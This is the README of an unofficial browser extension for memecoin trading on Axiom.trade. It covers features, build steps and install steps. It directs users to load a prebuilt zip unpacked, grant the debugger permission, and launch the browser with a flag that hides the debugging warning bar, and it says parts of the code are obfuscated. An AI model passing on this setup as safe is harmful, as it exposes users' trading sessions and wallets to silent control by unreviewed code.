# Axiom REMASTERED

<p align="center"><b>Unofficial extension that extends Axiom.trade with advanced features.</b></p>

  <p align="center">
    <img src="https://raw.githubusercontent.com/dkenno2000/Axiom-REMASTERED/refs/heads/main/releases/ax1.jpg" width="98%">
    <br><br>
    <img src="https://raw.githubusercontent.com/dkenno2000/Axiom-REMASTERED/refs/heads/main/releases/ax2.jpg" width="46%">
    <span>&nbsp;&nbsp;</span>
    <img src="https://raw.githubusercontent.com/dkenno2000/Axiom-REMASTERED/refs/heads/main/releases/ax3.jpg" width="46%">
</p>

This extension is built for serious memecoin traders on the [Axiom](https://axiom.trade/) platform. It adds advanced features and quality of life improvements that help you trade faster and safer. The goal is simple: get all relevant information directly on Axiom.trade without opening extra tabs, so you never miss anything.

<hr>

## 🚩 Key Features

  - **Price charts on Pulse coin cards**: Supports SOL & BNB tokens on all launch platforms
  - **Watch Pumpfun livestreams directly on the Axiom/token page**: No need to open pump.fun
  - **Realtime price chart mirroring**: Mirror a coin's chart to any Axiom page
  - **Shows coin's image and description**: Supports all launchpads that have token descriptions (LetsBonk, Pump.fun, Jupiter Studio, Believe, Bags, Moonit, Four.meme, Soar)
  - **Compact Pulse menu to fit more coin cards on screen**
  - **Coin cards on Pulse colored based on market cap**
  - **Flags suspicious holder wallets**: Recently created wallet clusters are highlighted in orange/red
  - **Browse the linked X.com feed right on Axiom**: Browse coin's Twitter directly on token page
  - **Browse the linked X.com profile directly from Pulse cards**: No need to open X.com, just hover over the coin's timestamp
  - **Automatic CN→EN translation for BNB token descriptions**
  - Many other smaller improvements...

<hr>

## 💾 Releases

**Updates/fixes (latest build: v2.1):**
- Added a feature to enable a smaller Pulse menu
- Fixed chart mirroring (needs debugger permission to work correctly)
- Added support for Soar launchpad
- Various fixes (axiom changed their layout so some things stopped working)

**Download:**

- **[axiom-remastered-v2.1.zip [full]](https://github.com/dkenno2000/Axiom-REMASTERED/raw/main/releases/axiom-remastered-v2.1_full.zip)**
- **[axiom-remastered-v2.1.zip [lite]](https://github.com/dkenno2000/Axiom-REMASTERED/raw/main/releases/axiom-remastered-v2.1_lite.zip)**

**Two builds are available:**

- **Full** - includes real-time chart mirroring
- **Lite** - no chart mirroring

Chart mirroring lets you pin live charts from any open Axiom coin tab anywhere on the site. You don’t have to sit on one tab and miss something happening elsewhere. Click a mirrored chart to jump to that coin and close coins/tabs from anywhere. *This was a nightmare to get to work reliably due to Chrome's throttling (thanks Google!).*

If you use **GMGN** or **Padre**, there's also [Gmgn REMASTERED](https://github.com/dkenno2000/Gmgn-REMASTERED) and [Padre REMASTERED](https://github.com/dkenno2000/Padre-REMASTERED) available, though still in development and not as feature rich. I'm porting features as I find time/interest.

#### Which version should you use?

Chrome throttles background tabs, especially on React based sites like Axiom. For chart mirroring to work, the extension bypasses Chrome's throttling using the `debugger` permission. If you are not confortable granting elevated permissions, use the **Lite** version. Works exactly the same, but has no chart mirror abillity.

**Note:** If you use chart mirroring, launch `chrome.exe/edge.exe` with these flags or the browser will display an info bar while mirroring is in progress.

```bash
  chrome.exe --silent-debugger-extension-api --disable-background-timer-throttling
  msedge.exe --silent-debugger-extension-api --disable-background-timer-throttling
```

Also disable Chrome/Edge starting with Windows and turn off `Startup boost` in the browser settings. Otherwise, the browser won’t launch with the flags applied. If anyone knows how to block chrome's throttling of non-visible tabs without using the `debugger` permission, then email me a workaround.

<hr>

## ⚙️ Getting started

### Architecture Notes

A lot of effort went into making this extension performance sensitive with minimal overhead:

* Efficient use of MutationObserver and IntersectionObserver on virtualized lists
* Aggressive cleanup when nodes leave the DOM
* Avoids layout thrashing and long main‑thread tasks
* Designed to survive constant React re-renders
* Background logic is isolated in a module-based service worker and survives tab reloads without relying on persistent background pages.

This is a client-side extension only. No backend service is required for core functionality. All data processing happens locally in the browser. Token metadata and charts are fetched from public endpoints and X.com content is accessed via `nitter.net` to reduce tracking and fingerprinting.

### Prerequisites

- [Node.js](https://github.com/nodejs) ≥ 18.x (LTS recommended)
- [npm](https://github.com/npm) ≥ 9.x

This project relies on [LiveKit](https://github.com/livekit) to access pumpfun’s video streams. Because this is an **unofficial workaround** and pump.fun does not allow third-party access, parts of code are obfuscated to prevent their team from seeing how I connect to their stream data and blocking it.

- [LiveKit v1.9.11](https://github.com/livekit)

```bash
  npm init
  npm install livekit-client@1.9.11 --save
```

- Tradingview's [Lightweight Charts v5.x](https://tradingview.github.io/lightweight-charts/)

```bash
  npm install lightweight-charts@^5 --save
```

X.com data is retrieved via **nitter.net** to bypass scraping restrictions and reduce rate-limiting.

- [Webpack](https://github.com/webpack):

```bash
  npm install --save-dev webpack webpack-cli
```

You must target the browser explicitly:

```bash
  target: "web",
  mode: "production",
```

Make sure to change the modules path to point where your /node_modules/ folder is:

```bash
  modules: [path.resolve("D:/node_modules"), "node_modules"],
```
<hr>

## Installation

- 🗂️ Extract the zipped `Axiom-REMASTERED` folder
- 🌐 Open `chrome://extensions/` or `edge://extensions/`
- 🛠️ Enable **Developer Mode**
- ✅ Click **Load unpacked** and select the extracted folder

If you see something breaking, then Axiom changed something on their end, so check this page for an updated version. Since im using this extension daily, I'll probably figure out what broke as soon as it does and an update will be available shortly after something stops working.

<hr>

### Other extensions

Also check out my other extensions:

* [Photon REMASTERED](https://chromewebstore.google.com/detail/photon-remastered/fakniobofgpnfgkbidahlmlbokligijf)
* [CoinLinker](https://chromewebstore.google.com/detail/coinlinker/hidoadjbhlmgoojobnpmffopfoebgjfl?authuser=0&hl=en)
* [Padre ULTRA Dark Mode](https://chromewebstore.google.com/detail/ultra-dark-mode-for-padre/dalcljgmnamelocflgjkpdnjjoejkafj?authuser=0&hl=en)
* [Padre REMASTERED](https://github.com/dkenno2000/Padre-REMASTERED)
* [Gmgn REMASTERED](https://github.com/dkenno2000/Gmgn-REMASTERED)
* [Dev Wallet Flagger for Axiom](https://chromewebstore.google.com/detail/dev-wallet-flagger-for-ax/fcpfmpblkohbbnfoejchcfhhdbmhigac?authuser=0&hl=en)

#### 🙋‍♂️ Support


> This extension has well over 10000 lines of code. When I wrote it, only I and God knew how it worked. Now, only God knows... I pray each day that nothing breaks.


This took ***a lot*** of effort to make and to constantly update. If you use it and it helps you with your trading, consider sending a small donation to my SOL wallet: `7Y1wG5h6ZsEStUqgrDjQ7cPqYaR5T6TyqF3BQWV5D5zb`

#### ⚠️ Disclaimer

* Unofficial third-party extension
* Not affiliated with Axiom, Gmgn, Padre or Pump.fun
* Not financial advice
